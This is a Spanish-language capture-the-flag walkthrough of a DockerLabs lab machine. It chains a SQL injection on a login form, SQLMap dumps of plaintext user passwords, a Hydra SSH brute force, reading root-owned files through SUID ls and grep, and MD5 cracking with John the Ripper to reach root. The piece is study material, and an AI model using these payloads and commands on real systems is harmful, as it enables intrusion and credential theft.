---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Web` `MariaDB` `SQLi` `Burp Suite` `SQLMap` `Hydra` `John The Ripper` `SUID`

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip backend.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh backend.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 16:35 CET
Nmap scan report for 172.17.0.2
Host is up (0.000026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 08:ba:95:95:10:20:1e:54:19:c3:33:a8:75:dd:f8:4d (ECDSA)
|_  256 1e:22:63:40:c9:b9:c5:6f:c2:09:29:84:6f:e7:0b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-title: test page
|_http-server-header: Apache/2.4.61 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```

Identificamos los puertos `22` y `80` abiertos.

Accedemos al servicio web en el puerto `80` y nos encontramos con la siguiente página:

![](../../images/backend.png)

Accedemos al panel de login mediante el botón superior y probamos una inyección `SQL`.

```
'admin#
password
```

![](../../images/mariadb.png)

Recibimos un error de sintaxis `SQL`. Esto nos indica que el aplicativo es posiblemente vulnerable a `SQLi`, ya que hemos logrado alterar la lógica de la consulta con éxito.

Utilizaremos `SQLMap` para intentar extraer información de las bases de datos existentes.

Para ello, interceptamos la petición de login con `BurpSuite`.

![](../../images/burps.png)

La guardamos en un archivo llamado `request.txt` para pasársela a `SQLMap`.

## SQLMAP

Enumeramos las bases de datos.

```bash
sqlmap -r request.txt --dbs
```

Info:

```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.11#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:54:21 /2025-12-04/

[16:54:21] [INFO] parsing HTTP request from 'request.txt'
it appears that provided value for POST parameter 'username' has boundaries. Do you want to inject inside? (''admin*#') [y/N] y
[16:54:22] [INFO] resuming back-end DBMS 'mysql' 
[16:54:22] [INFO] testing connection to the target URL
[16:54:22] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 1345=(SELECT (CASE WHEN (1345=1345) THEN 1345 ELSE (SELECT 7846 UNION SELECT 7739) END))-- -&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 4786 FROM(SELECT COUNT(*),CONCAT(0x717a6a7071,(SELECT (ELT(4786=4786,1))),0x7178627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KkNi&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1463 FROM (SELECT(SLEEP(5)))gsvc)-- RxFg&password=admin
---
[16:54:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[16:54:22] [INFO] fetching database names
[16:54:22] [INFO] resumed: 'information_schema'
[16:54:22] [INFO] resumed: 'mysql'
[16:54:22] [INFO] resumed: 'performance_schema'
[16:54:22] [INFO] resumed: 'sys'
[16:54:22] [INFO] resumed: 'users'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

[16:54:22] [INFO] fetched data logged to text files under '/home/trihack/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 16:54:22 /2025-12-04/
```

Encontramos 5 bases de datos, y nos llama la atención una en particular llamada `users`.

Procedemos a extraer información de esta base de datos.

```bash
sqlmap -r request.txt -D users --tables
```

Info:

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.11#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:00:13 /2025-12-04/

[17:00:13] [INFO] parsing HTTP request from 'request.txt'
it appears that provided value for POST parameter 'username' has boundaries. Do you want to inject inside? (''admin*#') [y/N] y
[17:00:15] [INFO] resuming back-end DBMS 'mysql' 
[17:00:15] [INFO] testing connection to the target URL
[17:00:15] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 1345=(SELECT (CASE WHEN (1345=1345) THEN 1345 ELSE (SELECT 7846 UNION SELECT 7739) END))-- -&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 4786 FROM(SELECT COUNT(*),CONCAT(0x717a6a7071,(SELECT (ELT(4786=4786,1))),0x7178627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KkNi&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1463 FROM (SELECT(SLEEP(5)))gsvc)-- RxFg&password=admin
---
[17:00:15] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[17:00:15] [INFO] fetching tables for database: 'users'
[17:00:15] [INFO] resumed: 'usuarios'
Database: users
[1 table]
+----------+
| usuarios |
+----------+

[17:00:15] [INFO] fetched data logged to text files under '/home/trihack/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 17:00:15 /2025-12-04/
```

Identificamos una tabla llamada `usuarios`.

```bash
sqlmap -r request.txt -D users -T usuarios --columns
```

Info:

```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.11#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:00:31 /2025-12-04/

[17:00:31] [INFO] parsing HTTP request from 'request.txt'
it appears that provided value for POST parameter 'username' has boundaries. Do you want to inject inside? (''admin*#') [y/N] y
[17:00:33] [INFO] resuming back-end DBMS 'mysql' 
[17:00:33] [INFO] testing connection to the target URL
[17:00:33] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 1345=(SELECT (CASE WHEN (1345=1345) THEN 1345 ELSE (SELECT 7846 UNION SELECT 7739) END))-- -&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 4786 FROM(SELECT COUNT(*),CONCAT(0x717a6a7071,(SELECT (ELT(4786=4786,1))),0x7178627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KkNi&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1463 FROM (SELECT(SLEEP(5)))gsvc)-- RxFg&password=admin
---
[17:00:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[17:00:33] [INFO] fetching columns for table 'usuarios' in database 'users'
[17:00:33] [INFO] resumed: 'id'
[17:00:33] [INFO] resumed: 'int(11)'
[17:00:33] [INFO] resumed: 'username'
[17:00:33] [INFO] resumed: 'varchar(255)'
[17:00:33] [INFO] resumed: 'password'
[17:00:33] [INFO] resumed: 'varchar(255)'
Database: users
Table: usuarios
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+

[17:00:33] [INFO] fetched data logged to text files under '/home/trihack/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 17:00:33 /2025-12-04/
```

Al listar las columnas de la tabla `usuarios`, encontramos los campos: `id`, `password` y `username`.

Vamos a intentar volcar toda la información contenida en esos campos.

```bash
sqlmap -r request.txt -D users -T usuarios --dump
```

Info:

```
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.11#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:00:43 /2025-12-04/

[17:00:43] [INFO] parsing HTTP request from 'request.txt'
it appears that provided value for POST parameter 'username' has boundaries. Do you want to inject inside? (''admin*#') [y/N] y
[17:00:44] [INFO] resuming back-end DBMS 'mysql' 
[17:00:44] [INFO] testing connection to the target URL
[17:00:44] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 1345=(SELECT (CASE WHEN (1345=1345) THEN 1345 ELSE (SELECT 7846 UNION SELECT 7739) END))-- -&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 4786 FROM(SELECT COUNT(*),CONCAT(0x717a6a7071,(SELECT (ELT(4786=4786,1))),0x7178627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KkNi&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1463 FROM (SELECT(SLEEP(5)))gsvc)-- RxFg&password=admin
---
[17:00:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[17:00:44] [INFO] fetching columns for table 'usuarios' in database 'users'
[17:00:44] [INFO] resumed: 'id'
[17:00:44] [INFO] resumed: 'int(11)'
[17:00:44] [INFO] resumed: 'username'
[17:00:44] [INFO] resumed: 'varchar(255)'
[17:00:44] [INFO] resumed: 'password'
[17:00:44] [INFO] resumed: 'varchar(255)'
[17:00:44] [INFO] fetching entries for table 'usuarios' in database 'users'
[17:00:44] [INFO] resumed: '1'
[17:00:44] [INFO] resumed: '$paco$123'
[17:00:44] [INFO] resumed: 'paco'
[17:00:44] [INFO] resumed: '2'
[17:00:44] [INFO] resumed: 'P123pepe3456P'
[17:00:44] [INFO] resumed: 'pepe'
[17:00:44] [INFO] resumed: '3'
[17:00:44] [INFO] resumed: 'jjuuaann123'
[17:00:44] [INFO] resumed: 'juan'
Database: users
Table: usuarios
[3 entries]
+----+---------------+----------+
| id | password      | username |
+----+---------------+----------+
| 1  | $paco$123     | paco     |
| 2  | P123pepe3456P | pepe     |
| 3  | jjuuaann123   | juan     |
+----+---------------+----------+

[17:00:44] [INFO] table 'users.usuarios' dumped to CSV file '/home/trihack/.local/share/sqlmap/output/172.17.0.2/dump/users/usuarios.csv'
[17:00:44] [INFO] fetched data logged to text files under '/home/trihack/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 17:00:44 /2025-12-04/
```

Conseguimos visualizar un listado de usuarios y contraseñas. Guardamos estos datos en dos archivos separados.

```bash
nano users.txt
```

```
paco
pepe
juan
```

***

```bash
nano pass.txt
```

```
$paco$123
P123pepe3456P
jjuuaann123
```

## HYDRA

Realizamos un ataque de `fuerza bruta` contra el servicio `SSH` utilizando las credenciales obtenidas.

```bash
hydra -L users.txt -P pass.txt ssh://172.17.0.2 -t 64
```

Info:

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-04 17:09:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: pepe   password: P123pepe3456P
1 of 1 target successfully completed, 1 valid password found
```

Encontramos credenciales válidas para el usuario `pepe` : `P123pepe3456P`.

Accedemos por `SSH`.

```bash
ssh pepe@172.17.0.2
```

## ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo` y `SUID`.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Info:

```
/usr/bin/umount
/usr/bin/chsh
/usr/bin/su
/usr/bin/ls
/usr/bin/mount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/grep
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Vemos que podemos ejecutar los binarios `ls` y `grep`, probablemente con privilegios de `root`.

Aprovechamos esto para listar el contenido del directorio `/root`, al cual no deberíamos tener acceso.

```bash
/usr/bin/ls -la /root
```

Info:

```
total 24
drwx------ 1 root root 4096 Aug 27  2024 .
drwxr-xr-x 1 root root 4096 Dec  4 15:34 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
drwx------ 2 root root 4096 Aug 27  2024 .ssh
-rw-r--r-- 1 root root   33 Aug 27  2024 pass.hash
```

Identificamos un archivo que contiene el `hash` de una posible contraseña. Utilizamos el binario `grep` con permisos elevados para leer su contenido.

```bash
/usr/bin/grep '' /root/pass.hash
```

Info:

```
e43833c4c9d5ac444e16bb94715a75e4
```

Guardamos el `hash` en un archivo `hash.txt` en nuestra máquina atacante.

Identificamos que se trata de un `hash MD5` (32 caracteres). Utilizamos `John The Ripper` para crackearlo.

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob34      (?)     
1g 0:00:00:00 DONE (2025-12-04 17:20) 16.66g/s 13081Kp/s 13081Kc/s 13081KC/s spoonieg7..spicyc1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Obtenemos la contraseña en texto plano: `spongebob34`.

Volvemos a la sesión de `pepe` e intentamos autenticarnos como `root` utilizando la contraseña encontrada.

```bash
su root
#password spongebob34
```

```
root@cccfa5e90f12:/home/pepe# whoami
root
root@cccfa5e90f12:/home/pepe#
```

Ya somos root!
